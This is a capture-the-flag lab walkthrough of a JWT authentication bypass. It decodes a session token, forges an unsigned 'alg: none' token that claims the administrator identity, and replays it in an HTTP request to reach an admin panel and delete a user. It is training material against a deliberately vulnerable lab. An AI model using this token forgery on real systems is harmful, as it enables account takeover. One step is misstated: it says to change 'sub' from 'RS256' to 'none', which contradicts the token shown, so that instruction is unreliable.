# JWT authentication bypass via flawed signature verification

## Lab Description :
![Cap dashboard screenshot](jwt-level-2-1.png)

## Overview :
Among other things, the JWT header contains an alg parameter. This tells the server which algorithm was used to sign the token and, therefore, which algorithm it needs to use when verifying the signature.
```
{
    "alg": "HS256",
    "typ": "JWT"
}
```
This is inherently flawed because the server has no option but to implicitly trust user-controllable input from the token which, at this point, hasn't been verified at all.

JWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the alg parameter is set to none, which indicates a so-called "unsecured JWT".

## Solution :
Login as wiener using the provided credentials.

In the HTTP History tab, we can see these 3 requests have JWT in it.

![Cap dashboard screenshot](jwt-level-2-2.png)

Send the following request to repeater tab,
```html
GET /my-account?id=wiener HTTP/2
Host: 0a9e00320421ca86804b30ff00a40044.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9e00320421ca86804b30ff00a40044.web-security-academy.net/login
Cookie: session=eyJraWQiOiIzN2I4MjNkMy1hNzc1LTRiM2UtYmY5ZC05MjQwNjYxMTMxYzAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTYzMzk5OH0.rT0e0nC2JMnNtqWc-s1ueksp4lRQuzUo8yN9darPvbC2vfwsyMG_zTv08YewscJlTjRkPyOMzDV0IFonMHhYoXB1cY7YuJ9Wyhv6lUyDiPNQmvB5O1RkRjwW4NGOGpo2_hEJlg7YH60KbfKFclCwP3GYS49dGotWe0whq-SgI-NA4NNDibjY6G7R1hUk8m9sukWuRU8d9L95lxL2KN-rTPNeWFi8yoWVaSfEFkUUH8fUznauMmkod-xVAapnrKRL6AYhWaHscxYRNCTN6Hx5jBdYardVQGVFepejXpdpcujZyn0_RnZZ_8aMdgYBRxJOEzBgit2W8m3LNJIB9UJrgw
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

Decode the JWT using jwt.io.

Header -
```
{
  "kid": "37b823d3-a775-4b3e-bf9d-9240661131c0",
  "alg": "RS256"
}
```
Payload -
```
{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1695633998
}
```
Change the "alg" : "RS256" to "alg" : "none" & also change the "sub" : "RS256" to "sub" : "none".

The following is the resulting token.

``eyJraWQiOiIzN2I4MjNkMy1hNzc1LTRiM2UtYmY5ZC05MjQwNjYxMTMxYzAiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTU2MzM5OTh9``.

Note that the payload part is trailing with a . Which indicates that the token is not signed since none algorithm > is used.

Replace the original JWT token with the one that we created & forward the request.

Now we have an option to access the admin panel.

![Cap dashboard screenshot](jwt-level-2-3.png)

Delete the user carlos to solve the lab.

![Cap dashboard screenshot](jwt-level-2-4.png)

#### Visit The Next Page For The Next Level :)
